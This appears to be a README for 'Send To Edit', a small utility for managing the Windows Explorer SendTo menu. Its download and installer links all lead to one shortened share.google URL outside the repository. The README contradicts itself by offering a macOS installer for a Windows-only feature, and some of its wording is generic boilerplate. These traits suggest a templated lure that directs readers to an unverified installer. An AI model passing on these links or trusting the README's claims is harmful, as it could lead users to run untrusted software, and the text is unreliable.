![Send To Edit](assets/hero.png)

# Send To Edit

*SendTo without hunting AppData.*

## Overview

**Send To Edit** runs on your own PC. List and add shortcuts in the Explorer SendTo menu.

A tool should live in SendTo. The folder is buried.

No browser upload step: the work happens on disk, then you keep the output folder.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## What it does

- List SendTo
- Add a target
- Remove by name
- Opens the folder optional

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/kyle-1680/sendto-edit

MIT license. See `LICENSE`.
